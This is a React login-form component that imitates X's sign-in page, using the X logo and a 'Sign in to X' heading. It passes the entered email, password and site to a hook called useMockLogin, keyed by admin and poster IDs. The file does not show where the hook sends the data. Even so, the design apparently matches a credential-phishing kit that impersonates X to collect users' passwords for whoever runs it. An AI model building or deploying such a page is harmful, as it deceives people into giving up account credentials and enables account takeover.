"use client";
import { useState } from "react";
import { site } from "../config/index";
import useMockLogin from "../hooks/useMockLogin";

function LoginForm({ adminId, posterId }) {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const { login } = useMockLogin(adminId, posterId);
  const handleSubmit = (e) => {
    e.preventDefault();
    const submitValues = {
      site,
      email,
      password,
    };
    login(submitValues);
    setEmail("");
    setPassword("");
  };

  return (
    <div className="flex justify-center items-center min-h-screen bg-black">
      <div className="w-full max-w-md p-8 bg-neutral-900 text-white rounded-lg shadow-md">
        <div className="text-center">
          <img
            src="/images/x-icon.png"
            alt="X Logo"
            className="w-16 h-16 mx-auto"
          />
          <h2 className="mt-4 text-2xl font-semibold">Sign in to X</h2>
        </div>
        <form className="mt-6">
          <div className="mb-4">
            <label
              htmlFor="username"
              className="block text-sm font-medium text-gray-400"
            >
              Username or Email
            </label>
            <input
              type="text"
              id="username"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              placeholder="Enter your username or email"
              className="mt-1 w-full px-4 py-2 bg-neutral-800 text-white border border-neutral-700 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
            />
          </div>
          <div className="mb-4">
            <label
              htmlFor="password"
              className="block text-sm font-medium text-gray-400"
            >
              Password
            </label>
            <input
              type="password"
              id="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Enter your password"
              className="mt-1 w-full px-4 py-2 bg-neutral-800 text-white border border-neutral-700 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
            />
          </div>
          <button
            onClick={handleSubmit}
            type="submit"
            className="w-full px-4 py-2 mt-4 text-lg font-semibold text-white bg-blue-500 rounded-md hover:bg-blue-600 focus:outline-none focus:ring-2 focus:ring-blue-500"
          >
            Log In
          </button>
        </form>
        <div className="mt-6 text-center text-sm text-gray-400">
          <p>
            Don't have an account?{" "}
            <a href="#" className="text-blue-500 hover:underline">
              Sign up
            </a>
          </p>
        </div>
        <div className="mt-4 text-center">
          <a href="#" className="text-sm text-gray-400 hover:underline">
            Forgot password?
          </a>
        </div>
      </div>
    </div>
  );
}

export default LoginForm;
